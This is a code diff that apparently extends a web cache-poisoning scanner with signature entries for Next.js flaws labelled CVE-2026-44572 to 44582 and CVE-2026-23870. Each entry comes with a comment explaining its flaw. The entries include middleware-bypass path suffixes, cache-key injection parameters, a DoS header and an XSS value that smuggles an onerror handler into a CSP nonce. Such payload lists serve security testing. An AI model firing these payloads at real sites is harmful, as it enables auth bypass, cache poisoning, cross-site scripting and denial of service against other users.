@@ -313,4 +313,85 @@ def get_all_signatures(payload_id: str) -> List[Dict]:
         {"name": "Traceparent-Poison", "header": "Traceparent", "value": f"00-{payload_id}aabbccddeeff0011-aabbccdd-01"},
         {"name": "Cdn-Loop-Poison", "header": "Cdn-Loop", "value": f"evil-{payload_id}"},
         {"name": "True-Client-IP-Poison", "header": "True-Client-IP", "value": f"evil-{payload_id}.com"},
+
+        # ===== CVE-2026: Next.js Cache Poisoning (next-16.2.4-pocs) =====
+
+        # CVE-2026-44572: x-nextjs-data redirect cache poisoning
+        # Sending x-nextjs-data: 1 to redirect endpoints causes 200 OK with x-nextjs-redirect
+        # header instead of proper 307 redirect. CDN caches the broken 200 response.
+        {"name": "NextJS-XData-Redirect-Poison", "header": "x-nextjs-data", "value": "1",
+         "cve": "CVE-2026-44572"},
+        {"name": "NextJS-XData-Redirect-Poison-Alt", "type": "method_override", "header": "x-nextjs-data", "value": "1",
+         "cve": "CVE-2026-44572"},
+
+        # CVE-2026-44576: RSC/HTML cache confusion
+        # Spoofed RSC header causes server to render RSC payload but cache classifies it
+        # as HTML due to URL suffix check failing on query strings. CDN serves binary RSC
+        # data as text/html to all users.
+        {"name": "NextJS-RSC-Cache-Confusion", "header": "RSC", "value": "text/x-component",
+         "cve": "CVE-2026-44576"},
+        {"name": "NextJS-RSC-Cache-Confusion-Loose", "header": "RSC", "value": "true",
+         "cve": "CVE-2026-44576"},
+        {"name": "NextJS-RSC-Spoofed-With-Prefetch", "header": "RSC", "value": "1",
+         "cve": "CVE-2026-44576"},
+
+        # CVE-2026-44582: Weak _rsc cache-busting hash (32-bit MurmurHash collision)
+        # _rsc parameter uses weak 32-bit hash — brute-force collision in ~2^16 attempts.
+        # Attacker crafts headers that produce same _rsc hash but different RSC payload.
+        {"name": "NextJS-RSC-Hash-Collision-Prefetch", "header": "Next-Router-Prefetch", "value": "1",
+         "cve": "CVE-2026-44582"},
+        {"name": "NextJS-RSC-Hash-Collision-Segment", "header": "Next-Router-Segment-Prefetch", "value": f"__PAGE__-{payload_id}",
+         "cve": "CVE-2026-44582"},
+
+        # CVE-2026-44575: App Router middleware bypass via .rsc suffix
+        # Middleware regex doesn't match .rsc transport suffix, bypassing auth checks.
+        # RSC payload with sensitive data gets cached.
+        {"name": "NextJS-RSC-Suffix-Bypass", "type": "path", "mutation": "simple_append", "value": ".rsc",
+         "cve": "CVE-2026-44575"},
+        {"name": "NextJS-Segment-Prefetch-Bypass", "type": "path", "mutation": "simple_append",
+         "value": ".segments/$c$children/__PAGE__.segment.rsc",
+         "cve": "CVE-2026-44575"},
+
+        # CVE-2026-44573: i18n data-route bypass
+        # Pages Router i18n data-route without locale prefix bypasses middleware.
+        # Combined with x-nextjs-data header for full bypass.
+        {"name": "NextJS-i18n-DataRoute-Bypass", "header": "x-nextjs-data", "value": "1",
+         "cve": "CVE-2026-44573"},
+
+        # CVE-2026-44574: nxtP parameter injection for cache key confusion
+        # Injecting nxtP* query params causes middleware/renderer mismatch.
+        # Different renders cached under same canonical URL.
+        {"name": "NextJS-nxtP-Param-Inject", "type": "query_param", "param": "nxtPslug",
+         "value": f"evil-{payload_id}", "cve": "CVE-2026-44574"},
+        {"name": "NextJS-nxtI-Param-Inject", "type": "query_param", "param": "nxtIslug",
+         "value": f"evil-{payload_id}", "cve": "CVE-2026-44574"},
+        {"name": "NextJS-Private-No-Middleware", "type": "query_param",
+         "param": "__NEXT_PRIVATE_NO_MIDDLEWARE_RUN", "value": "1",
+         "cve": "CVE-2026-44574"},
+
+        # CVE-2026-44579: next-resume header injection (cache poisoning + DoS)
+        # Unfiltered next-resume header triggers PPR resume codepath.
+        # Resume-rendered response differs from normal render; cached for all users.
+        {"name": "NextJS-Resume-Poison", "header": "next-resume", "value": "1",
+         "cve": "CVE-2026-44579"},
+        {"name": "NextJS-Resume-State-Poison", "header": "x-next-resume-state-length",
+         "value": f"999-{payload_id}", "cve": "CVE-2026-44579"},
+
+        # CVE-2026-44578: WebSocket upgrade SSRF (cache poisoning side-effect)
+        # Absolute-URL WebSocket upgrade bypasses route resolution.
+        # If rejection gets cached, DoS for all users.
+        {"name": "NextJS-WS-Upgrade-SSRF", "type": "exotic", "header": "Upgrade", "value": "websocket",
+         "cve": "CVE-2026-44578"},
+
+        # CVE-2026-44581: CSP nonce injection → cached XSS
+        # Malformed CSP nonce in request header reflects into cached HTML attributes.
+        {"name": "NextJS-CSP-Nonce-Inject", "header": "Content-Security-Policy",
+         "value": f"script-src 'nonce-\" onerror=\"alert({payload_id})'",
+         "cve": "CVE-2026-44581"},
+
+        # CVE-2026-23870: Server-action stream DoS (cache poisoning side-effect)
+        # Malformed RSC action body triggers CPU/memory exhaustion.
+        # Error response may be cached.
+        {"name": "NextJS-Action-DoS", "type": "method_override", "header": "Next-Action",
+         "value": "0" * 40, "cve": "CVE-2026-23870"},
     ]
